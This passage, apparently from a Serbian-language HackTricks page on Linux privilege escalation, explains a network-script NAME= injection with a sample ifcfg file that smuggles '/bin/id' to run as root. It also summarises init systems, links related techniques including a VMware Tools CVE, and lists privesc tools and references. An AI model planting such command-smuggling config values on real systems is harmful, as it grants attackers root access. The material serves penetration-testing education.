**Referenca ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako je, iz bilo kog razloga, korisniku omogućeno da **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** da **adjust** postojeću, vaš **system is pwned**.

Network scripts, na primer _ifcg-eth0_, koriste se za mrežne konekcije. Izgledaju potpuno isto kao .INI fajlovi. Međutim, Network Manager ih na Linuxu \~sourced\~ (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network scripts nije pravilno obrađen. Ako u nazivu postoji **white/blank space, sistem pokušava da izvrši deo nakon white/blank space-a**. To znači da se **sve nakon prvog blank space-a izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Obratite pažnju na razmak između Network i /bin/id_)

### **init, init.d, systemd, i rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, a ponekad i `reload` servisa. Mogu se izvršavati direktno ili putem simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je povezan sa **Upstart** sistemom, novijim **sistemom za upravljanje servisima** koji je uveo Ubuntu i koji koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstartu.

**systemd** se pojavljuje kao moderan sistem za inicijalizaciju i upravljanje servisima, koji nudi napredne funkcije kao što su pokretanje daemon-a na zahtev, upravljanje automatskim montiranjem i snimci stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za distribution pakete i `/etc/systemd/system/` za izmene administratora, čime pojednostavljuje proces administracije sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks obično hook-uju syscall kako bi userspace manager-u izložili privilegovanu funkcionalnost kernela. Slaba autentikacija manager-a (npr. provere potpisa zasnovane na redosledu FD-ova ili loše šeme lozinki) može lokalnoj aplikaciji omogućiti da se lažno predstavi kao manager i dobije root na uređajima koji već imaju root pristup. Više informacija i detalje exploitation-a možete pronaći ovde:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Service discovery zasnovan na regex-u u VMware Tools/Aria Operations može da izdvoji putanju binarnog fajla iz komandnih linija procesa i izvrši je sa opcijom -v u privilegovanom kontekstu. Permisivni obrasci (npr. korišćenje \S) mogu da podudare listeners koje je attacker postavio u lokacijama sa dozvolom upisa (npr. /tmp/httpd), što dovodi do izvršavanja kao root (CWE-426 Untrusted Search Path).

Više informacija i generalizovani obrazac primenljiv na druge discovery/monitoring stack-ove možete pronaći ovde:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
